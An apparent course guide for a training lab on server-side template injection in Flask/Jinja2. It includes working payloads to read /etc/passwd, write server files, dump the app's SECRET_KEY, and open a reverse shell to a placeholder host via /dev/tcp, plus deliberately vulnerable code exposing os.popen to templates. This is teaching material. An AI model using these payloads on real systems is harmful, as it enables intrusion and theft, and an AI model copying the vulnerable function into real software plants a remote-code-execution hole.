# Server side template injection

This is the course guide for server-side template injection.

Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

Follow the full source to find how to discover this vulnerability and how to determine the templating engine
that is being used by the application.

[full source here](https://portswigger.net/blog/server-side-template-injection)

### Objective 

* Use template injection to read the flask "configurations" such as the secret for signing JWT tokens
* Use template injection to envoke a local function to leverage RCE

#### Semi spoiler!

Included [here](https://github.com/RiieCco/owasp-bay-area/tree/master/course-guide/server-side-template-injection/report.html) is the scan report of a Burp intruder scan on the target. Use this scan report to pinpoint the exact location of the vulnerability.


#### This works for python 2

Jinja2 - Read remote file
```
# ''.__class__.__mro__[2].__subclasses__() = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

Jinja2 - Write into remote file
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
Jinja2 - Remote Code Execution via reverse shell
Listen for connexion
```
nv -lnvp 8000
```

Inject this template
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
```

#### However we use python3 

In this scenario we use python3 to leverage the attack so the method as mentioned above is no longer
valid. We need to find other ways for exploitation. Even without nice methods to iterate the subclasses 
as with python3 we can still get a lot of interesting information about the system.

try to inject:

```
{{ config.items() }}
```

Here we find al the different configurations of the target. Amongst others we find the 

```
('SECRET_KEY', 'random')
```

This key is used to sign the JWT tokens and can iie be used to gain unauthorized access to the
application.

#### Spoiler - exploitation of the target.

The developer of this application thought it was a good idea to have a generic function for his
monitoring and make this function callable by the templating engine, this way he could easilly utilize 
system commands on a easy and secure way (or so he thought) to monitor the system.

We can now abuse the template expression to invoke this command with our own 
system command injection like

```
http://0.0.0.0:8081/{{system_call('netcat listener pwn')}}
```

Here follows the code that is responsible for the vulnerability:

```
@app.context_processor
def utility_processor():
    def system_call(command):
        output = os.popen(command).read()
        return output
    return dict(system_call=system_call)
